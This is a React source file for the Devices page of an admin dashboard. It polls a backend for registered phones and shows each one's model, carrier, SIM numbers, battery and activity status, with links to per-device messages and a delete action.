
import { useEffect, useState, useRef } from "react";
import AdminNavigation from "./AdminNavigation";
import { Smartphone } from "lucide-react";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import API_URL from "../apiConfig";

export default function Devices() {
  const [devices, setDevices] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [search, setSearch] = useState("");
  const navigate = useNavigate();

  const intervalRef = useRef();
  useEffect(() => {
    const fetchDevices = async () => {
      try {
        setError("");
        const res = await axios.get(`${API_URL}/getAllDevices`, { withCredentials: true });
        setDevices(res.data?.devices || res.data || []);
      } catch (err) {
        setError("Failed to fetch devices");
      } finally {
        setLoading(false);
      }
    };
    fetchDevices();
    intervalRef.current = setInterval(fetchDevices, 2500);
    return () => clearInterval(intervalRef.current);
  }, []);

  return (
    <AdminNavigation>
      <div class="max-w-6xl mx-auto px-2">
        <div class="flex flex-col gap-2 sm:flex-row sm:items-center sm:gap-3 mb-6">
          <div class="flex items-center gap-3">
            <div class="bg-purple-100 text-purple-600 rounded-full p-2">
              <Smartphone size={28} />
            </div>
            <h2 class="text-2xl font-bold text-white">Devices</h2>
          </div>
        </div>
        <div class="overflow-y-auto h-full pb-4 pr-1">

          <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-6">
            {loading ? (
              <div className="col-span-full text-center py-12 text-gray-400 text-lg">Loading devices...</div>
            ) : error ? (
              <div className="col-span-full text-center py-12 text-red-400 text-lg">{error}</div>
            ) : devices.length === 0 ? (
              <div className="col-span-full text-center py-12 text-gray-400 text-lg">No devices found.</div>
            ) : (
              [...devices]
                .filter(dev => {
                  const q = search.toLowerCase();
                  return (
                    (dev.deviceId || dev._id || '').toLowerCase().includes(q) ||
                    (dev.brand || '').toLowerCase().includes(q) ||
                    (dev.model || '').toLowerCase().includes(q) ||
                    (dev.manufacturer || '').toLowerCase().includes(q) ||
                    (dev.phoneNumber || '').toLowerCase().includes(q)
                  );
                })
                .sort((a, b) => {
                  // Active devices (green) at top, inactive (red) at bottom
                  if (a.isActive && !b.isActive) return -1;
                  if (!a.isActive && b.isActive) return 1;
                  return 0;
                })
                .map((dev, idx, arr) => (
                  <div
                    key={dev.deviceId}
                    className={`rounded-2xl shadow-lg p-5 border hover:scale-[1.02] transition-transform cursor-pointer 
                    ${dev.isActive ? 'bg-gradient-to-br from-green-100 via-white to-green-50 border-green-200' : 'bg-gradient-to-br from-red-100 via-white to-red-50 border-red-200'}`}
                    onClick={() => navigate(`/messages/${dev.deviceId}`)}
                    title="View messages for this device"
                  >
                    <div className="flex items-center gap-2 mb-2">
                      <span className={`text-xs font-bold px-2 py-0.5 rounded mr-2 ${dev.isActive ? 'bg-green-200 text-green-700' : 'bg-red-200 text-red-700'}`}>#{arr.length - idx}</span>
                      <span className="ml-auto text-xs text-gray-400">{dev.brand} {dev.model}</span>
                    </div>
                    <div className="flex items-center gap-2 mb-1">
                      {dev.isActive ? (
                        <span className="bg-green-200 text-green-700 px-2 py-0.5 rounded text-xs font-semibold">Active</span>
                      ) : (
                        <span className="bg-red-200 text-red-700 px-2 py-0.5 rounded text-xs font-semibold">Inactive</span>
                      )}
                      <span className="text-xs text-gray-400 ml-auto">{dev.lastActive ? `Last: ${new Date(dev.lastActive).toLocaleDateString()} ${new Date(dev.lastActive).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: true })}` : ''}</span>
                    </div>
                    <div className="flex items-center justify-between mb-1">
                      <span className={`font-bold ${dev.isActive ? 'text-green-700' : 'text-red-700'} text-lg`}>{dev.deviceId || dev._id || `Device-${idx + 1}`}</span>
                      <button
                        className="ml-2 p-1 rounded-full bg-red-100 hover:bg-red-200 text-red-600 transition"
                        title="Delete Device"
                        onClick={async (e) => {
                          e.stopPropagation();
                          if (!window.confirm('Are you sure you want to delete this device?')) return;
                          try {
                            await axios.delete(`${API_URL}/deleteDevice/${dev._id}`, { withCredentials: true });
                            setDevices((prev) => prev.filter((d) => (d.deviceId || d._id) !== (dev.deviceId || dev._id)));
                          } catch (err) {
                            alert('Failed to delete device.');
                          }
                        }}
                      >
                        <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" /></svg>
                      </button>
                    </div>
                    <div className="flex items-center gap-2 mb-1">
                      {dev.isActive ? (
                        <span className="bg-green-200 text-green-700 px-2 py-0.5 rounded text-xs font-semibold">Active</span>
                      ) : (
                        <span className="bg-red-200 text-red-700 px-2 py-0.5 rounded text-xs font-semibold">Inactive</span>
                      )}
                      <span className="text-xs text-gray-400 ml-auto">{dev.lastActive ? `Last: ${new Date(dev.lastActive).toLocaleString()}` : ''}</span>
                    </div>
                    <div className="text-xs mb-1 break-words">
                      <span className={`font-semibold ${dev.isActive ? 'text-green-700' : 'text-red-700'}`}>Manufacturer:</span> {dev.manufacturer}
                    </div>
                    <div className="text-xs mb-2 flex flex-wrap gap-2">
                      <span className={`px-2 py-0.5 rounded ${dev.isActive ? 'bg-green-100 text-green-700' : 'bg-red-100 text-red-700'}`}>OS: {dev.osVersion} {dev.sdkVersion ? `(SDK ${dev.sdkVersion})` : ''}</span>
                      <span className={`px-2 py-0.5 rounded ${dev.isActive ? 'bg-green-100 text-green-700' : 'bg-red-100 text-red-700'}`}>Carrier: {dev.carrierName}</span>
                      <span className={`px-2 py-0.5 rounded ${dev.isActive ? 'bg-green-100 text-green-700' : 'bg-red-100 text-red-700'}`}>SIM Slots: {dev.simSlotCount}</span>
                    </div>
                    <div className={`text-xs mb-2 break-words ${dev.isActive ? 'text-green-700' : 'text-red-700'}`}>
                      <span className={`font-semibold ${dev.isActive ? 'text-green-700' : 'text-red-700'}`}>Slot 1 Number:</span> {dev.slot1Number ? dev.slot1Number : <span className="text-gray-400 italic">(none)</span>} <br />
                      <span className={`font-semibold ${dev.isActive ? 'text-green-700' : 'text-red-700'}`}>Slot 2 Number:</span> {dev.slot2Number ? dev.slot2Number : <span className="text-gray-400 italic">(none)</span>}
                    </div>
                    <div className="flex items-center gap-2 mt-2">
                      <span className={`px-2 py-0.5 rounded text-xs font-semibold ${dev.isActive ? 'bg-green-100 text-green-700' : 'bg-red-100 text-red-700'}`}>Battery: {dev.batteryLevel}%</span>
                    </div>
                  </div>
                ))
            )}
          </div>
        </div>
      </div>
    </AdminNavigation>
  );
}
